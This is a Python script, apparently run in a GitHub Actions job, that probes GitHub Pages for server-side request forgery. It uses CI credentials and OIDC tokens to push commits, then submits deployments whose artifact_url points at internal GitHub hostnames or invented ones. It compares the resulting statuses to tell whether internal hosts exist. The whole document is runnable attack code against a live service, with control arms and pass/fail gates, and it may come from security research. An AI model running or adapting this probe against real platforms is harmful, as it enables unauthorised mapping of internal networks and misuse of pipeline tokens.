import json, os, ssl, sys, time, urllib.request, urllib.error
RUN=os.environ.get("GITHUB_RUN_ID","0"); REPO=os.environ["GITHUB_REPOSITORY"]
ART=os.environ.get("ART_ID","").strip(); GH=os.environ["GH_TOKEN"]; API="https://api.github.com"
def http(u,m="GET",b=None,t=30,auth=None):
    r=urllib.request.Request(u,method=m,data=json.dumps(b).encode() if b is not None else None)
    r.add_header("Authorization",auth or f"Bearer {GH}"); r.add_header("Accept","application/vnd.github+json")
    r.add_header("X-GitHub-Api-Version","2022-11-28")
    if b is not None: r.add_header("Content-Type","application/json")
    try:
        with urllib.request.urlopen(r,timeout=t,context=ssl.create_default_context()) as z:
            return z.status,z.read().decode("utf-8","replace")
    except urllib.error.HTTPError as e: return e.code,e.read().decode("utf-8","replace")
    except Exception as e: return -1,f"<{type(e).__name__}:{e}>"
def mint():   # RE-MINT PER ARM: run 38693054567 died on "iat invalid" mid-matrix
    r=urllib.request.Request(os.environ["ACTIONS_ID_TOKEN_REQUEST_URL"])
    r.add_header("Authorization",f"bearer {os.environ['ACTIONS_ID_TOKEN_REQUEST_TOKEN']}")
    with urllib.request.urlopen(r,timeout=30,context=ssl.create_default_context()) as z:
        return json.loads(z.read().decode()).get("value","") or ""
TERMINAL={"deployment_failed","deployment_attempt_error","deployment_content_failed","succeed",
          "deployment_cancelled","deployment_lost","deployment_finished","succeeded"}
def settle(did,budget=170):
    """returns (final, reached_terminal:bool, trail). in_progress at budget end is TIMEOUT, not terminal."""
    trail=[];last=None;t0=time.time()
    while time.time()-t0<budget:
        s,b=http(f"{API}/repos/{REPO}/pages/deployments/{did}")
        try: st=json.loads(b).get("status","?")
        except Exception: st=f"<{s}>"
        if st!=last: trail.append(f"{int(time.time()-t0)}s:{st}"); last=st
        if st in TERMINAL: return last,True," -> ".join(trail)
        time.sleep(7)
    return last,False," -> ".join(trail)+" [BUDGET-EXHAUSTED]"
def mkcommit(tag):
    s,b=http(f"{API}/repos/{REPO}/git/ref/heads/main")
    try: parent=json.loads(b)["object"]["sha"]
    except Exception: return None
    s,b=http(f"{API}/repos/{REPO}/git/commits/{parent}")
    try: tree=json.loads(b)["tree"]["sha"]
    except Exception: return None
    s,b=http(f"{API}/repos/{REPO}/git/commits","POST",{"message":f"s5-{tag}-{RUN}","tree":tree,"parents":[parent]})
    try: new=json.loads(b)["sha"]
    except Exception: return None
    http(f"{API}/repos/{REPO}/git/refs/heads/main","PATCH",{"sha":new,"force":False})
    return new

print("=== ARMS5-START ===",flush=True)
try:
    if not ART: print("🔴 ARMING GATE FAILED: no artifact id.",flush=True); sys.exit(0)
    GN="https://ssrf-target.iad.github.net"; GF="https://ssrf-target-qq7x4z.iad.github.net"
    PLAN=[("CTRL_nourl",None),
          ("CTRL_nxpub", f"https://zzq7x4z-nx-{RUN}.example.com/z.tar"),
          ("ghreal_1",   f"{GN}/z-{RUN}-1.tar"),
          ("ghfake_1",   f"{GF}/z-{RUN}-1.tar"),
          ("ghreal_2",   f"{GN}/z-{RUN}-2.tar"),
          ("ghfake_2",   f"{GF}/z-{RUN}-2.tar")]
    rows=[]
    for tag,url in PLAN:
        tok=mint()
        if len(tok)<20: print(f"  {tag}: 🔴 OIDC re-mint failed -> VOID arm",flush=True); rows.append((tag,None,"OIDC-VOID",False,"")); continue
        bver=mkcommit(tag)
        if not bver: print(f"  {tag}: commit failed -> VOID arm",flush=True); rows.append((tag,None,"COMMIT-VOID",False,"")); continue
        body={"pages_build_version":bver,"oidc_token":tok,"artifact_id":int(ART)}
        if url: body["artifact_url"]=url
        s,b=http(f"{API}/repos/{REPO}/pages/deployments","POST",body)
        did=None
        try: did=json.loads(b).get("id")
        except Exception: pass
        if not did:
            print(f"  {tag:<12} POST {s} NO-DEPLOYMENT {' '.join(b.split())[:110]}",flush=True)
            rows.append((tag,None,f"POST-{s}",False," ".join(b.split())[:110])); continue
        fin,term,trail=settle(did)
        http(f"{API}/repos/{REPO}/pages/deployments/{did}/cancel","POST",{})
        rows.append((tag,did,fin,term,trail))
        print(f"  {tag:<12} POST {s} dep={did[:12]} final={fin!r} terminal={term}  [{trail}]",flush=True)
        time.sleep(4)

    print("\n=== GATES ===",flush=True)
    ids=[r[1] for r in rows if r[1]]
    ok_sep = len(ids)>=4 and len(set(ids))==len(ids)
    ctrl=[r for r in rows if r[0]=="CTRL_nourl"]
    ok_ctrl = bool(ctrl) and ctrl[0][1] is not None
    print(f"  separable: {len(ids)} deployments, {len(set(ids))} distinct -> {ok_sep}",flush=True)
    print(f"  positive control (no artifact_url) created a deployment -> {ok_ctrl}",flush=True)
    nonterm=[r[0] for r in rows if r[1] and not r[3]]
    print(f"  arms that NEVER reached a terminal status (uninterpretable): {nonterm or 'none'}",flush=True)
    if not (ok_sep and ok_ctrl):
        print("🔴 VOID: gates failed; no destination claim.",flush=True); sys.exit(0)
    R=[r[2] for r in rows if r[0].startswith("ghreal") and r[3]]
    F=[r[2] for r in rows if r[0].startswith("ghfake") and r[3]]
    print(f"\n  ghreal terminal results: {R}",flush=True)
    print(f"  ghfake terminal results: {F}",flush=True)
    if len(R)<2 or len(F)<2:
        print("◻ INCONCLUSIVE: fewer than 2 terminal results per side, so stability is unproven. "
              "No differential claim.",flush=True)
    elif set(R)==set(F):
        print("◻ NO DIFFERENTIAL: real and invented internal names end identically -> the status "
              "channel does NOT distinguish an existing internal host from a nonexistent one.",flush=True)
    else:
        print(f"🔴🔴 DIFFERENTIAL, BOTH SIDES TERMINAL AND STABLE: real={set(R)} invented={set(F)}",flush=True)
finally:
    print("=== ARMS5-END ===",flush=True)
